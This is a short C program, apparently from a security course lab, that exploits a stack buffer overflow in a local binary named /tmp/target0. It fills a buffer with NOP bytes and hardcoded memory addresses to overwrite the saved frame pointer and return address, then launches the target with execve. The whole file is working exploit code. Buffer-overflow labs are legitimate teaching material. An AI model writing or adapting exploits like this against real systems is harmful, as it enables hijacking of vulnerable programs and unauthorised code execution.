#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/tmp/target0"
#define NOP     0x90

int main(void)
{
  char *args[3];
  char *env[1];

  char buf[30];
  memset(buf, NOP, 30);
  strncpy(buf+20, "\x28\xfe\xff\xbf", 4);
  strncpy(buf+24, "\x1d\x85\x04\x08", 4);
  strncpy(buf+28, "\0", 2);

  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;
  

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
